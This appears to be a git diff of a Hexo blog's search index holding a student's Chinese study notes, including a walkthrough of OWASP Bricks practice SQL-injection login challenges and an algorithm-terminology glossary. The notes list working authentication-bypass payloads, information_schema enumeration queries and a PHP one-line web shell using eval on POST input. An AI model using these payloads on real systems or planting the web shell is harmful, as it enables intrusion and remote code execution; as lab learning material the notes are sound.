@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[尝试简单的sql注入]]></title>
+    <url>%2F2018%2F11%2F02%2F%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[感觉有点汗颜，因为线代、高数，以及我萌生了想学算法的念头，导致我没时间学习安全，今天下午没课我就练了几道简单的sql注入题。说来都是巧合，昨天我们c语言老师推荐了第四版的《加密与解密》，今天我就望着价钱瑟瑟发抖，然后看见这本书是由看雪论坛的大神写的，所以机缘巧合就看到了这个帖子。https://bbs.pediy.com/thread-218653.htm这个帖子里提供了几个云靶机。我就选择了OWASP Bricks练手(我是菜鸟),这是地址http://43.247.91.228:83/login-pages.html第一题在username输入以下语句都可以，只要让引号闭合并使语句成立就行123451' or 1 #1' or 1 or '' or 1 #' or 1 or '1' or 1=1 # 第二题发现使用了js验证，加了黑名单禁止输入特殊字符。可以右键查看源代码看看js代码，然后打开开发者工具在console里修改该js函数，再使用注入语句就行了。 第三题发现它在两边加入了括号()，所以只要构造语句使括号闭合就行。121') or 1 #1') or 1 or(' 第四题和第三题差不多，只不过使用双引号””包裹字符串。121") or 1 #1") or 1 or (" 第五题直接用第一题的语句注入，发现返回了输入密码的MD5值，虽然我不知道这是干什么的。 第六题我也不知道是干啥的，可以直接注入，我搜了下题目名automatic redirect 叫自动重定向。我再问问大佬这是啥。]]></content>
+      <categories>
+        <category>web安全学习笔记</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[算法上的一些术语]]></title>
     <url>%2F2018%2F11%2F02%2F%E7%AE%97%E6%B3%95%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9C%AF%E8%AF%AD%2F</url>
     <content type="text"><![CDATA[我发现了一个较严重问题，就是听不懂大佬说的一些名词，感受到了莫名的恐惧？？？于是我从网上找了一些术语，写在这里。 OJ平台 简写 全称 中文称谓 OJ Online Judge 在线判题系统 AC Accepted 通过 WA Wrong Answer 答案错误 TLE Time Limit Exceed 超时 OLE Output Limit Exceed 超过输出限制 MLE Memory Limit Exceed 超内存 RE Runtime Error 运行时错误 PE Presentation Error 格式错误 CE Compile Error 无法编译 算法常用术语英中对照 英语 中文 Approximate String Matching 模糊匹配 Arbitrary Precision Arithmetic 高精度计算 Bandwidth Reduction 带宽压缩 Bin Packing 装箱问题 Calendrical Calculations 日期 Clique 最大团 Combinatorial Problems 组合问题 Computational Geometry 计算几何 Connected Components 连通分支 Constrained and Unconstrained Optimization 最值问题 Convex Hull 凸包 Cryptography 密码 Data Structures 基本数据结构 Determinants and Permanents 行列式 Dictionaries 字典 Discrete Fourier Transform 离散Fourier变换 Drawing Graphs Nicely 图的描绘 Drawing Trees 树的描绘 Edge and Vertex Connectivity 割边/割点 Edge Coloring 边染色 Eulerian Cycle / Chinese Postman Euler 回路/中国邮路 Factoring and Primality Testing 因子分解/质数判定 Feedback Edge/Vertex Set 最大无环子图 Finite State Machine Minimization 有穷自动机简化 Generating Graphs 图的生成 Generating Partitions 划分生成 GeneratingPermutations 排列生成 GeneratingSubsets 子集生成 Graph Data Structures 图形数据结构 Graph Isomorphism 图同构 Graph Partition 图的划分 Graph Problems — hard 图论-NP问题 Graph Problems — polynomial 图论-多项式算法 Hamiltonian Cycle Hamilton 回路 Independent Set 独立集 Intersection Detection 碰撞测试 Job Scheduling 工程安排 Kd-Trees 线段树 Knapsack Problem 背包问题 Linear Programming 线性规划 Longest Common Substring 最长公共子串 Maintaining Line Arrangements 平面分割 Matching 匹配 Matrix Multiplication 矩阵乘法 Medial-Axis Transformation 中轴变换 Median and Selection 中位数 Minimum Spanning Tree 最小生成树 Minkowski Sum Minkowski和 Motion Planning 运动规划 Nearest Neighbor Search 最近点对查询 Network Flow 网络流 Numerical Problems 数值问题 Planarity Detection and Embedding 平面性检测和嵌入 Point Location 位置查询 Polygon Partitioning 多边形分割 Priority Queues 优先队列 Random Number Generation 随机数生成 Range Search 范围查询 rate of convergence 收敛速度 robustness 鲁棒性 Satisfiability 可满足性 Searching 查找 Set and String Problems 集合与串的问题 Set Cover 集合覆盖 Set Data Structures 集合 Shape Similarity 相似多边形 Shortest Common Superstring 最短公共父串 Shortest Path 最短路径 Simplifying Polygons 多边形化简 Solving Linear Equations 线性方程组 Sorting 排序 Steiner Tree Steiner树 String Matching 模式匹配 Text Compression 压缩 Topological Sorting 拓扑排序 Transitive Closure and Reduction 传递闭包 Traveling Salesman Problem 旅行商问题 Triangulation 三角剖分 Vertex Coloring 点染色 Vertex Cover 点覆盖 Voronoi Diagrams Voronoi图]]></content>
@@ -32,8 +44,8 @@
         <category>算法竞赛学习笔记</category>
       </categories>
       <tags>
-        <tag>算法</tag>
         <tag>python</tag>
+        <tag>算法</tag>
         <tag>c</tag>
       </tags>
   </entry>
@@ -45,8 +57,8 @@
         <category>算法竞赛学习笔记</category>
       </categories>
       <tags>
-        <tag>算法</tag>
         <tag>python</tag>
+        <tag>算法</tag>
       </tags>
   </entry>
   <entry>
@@ -76,7 +88,7 @@
   <entry>
     <title><![CDATA[菜鸟初学web]]></title>
     <url>%2F2018%2F10%2F19%2F%E8%8F%9C%E9%B8%9F%E5%88%9D%E5%AD%A6web%2F</url>
-    <content type="text"><![CDATA[密码绕过漏洞:11' or 1=1 '1 mysql手工注入:123select table_name from information_schema.tables where table_schema="";select column_name from information_schema.columns where table_name=""; php一句话木马:123&lt;?php @eval($_POST[ 'pass' ]);?&gt;"?&gt;&lt;?php @eval($_POST[ 'pass' ]);?&gt;&lt;?php#]]></content>
+    <content type="text"><![CDATA[密码绕过漏洞:11' or 1 # mysql手工注入:123select table_name from information_schema.tables where table_schema="";select column_name from information_schema.columns where table_name=""; php一句话木马:123&lt;?php @eval($_POST[ 'pass' ]);?&gt;"?&gt;&lt;?php @eval($_POST[ 'pass' ]);?&gt;&lt;?php#]]></content>
       <categories>
         <category>web安全学习笔记</category>
       </categories>
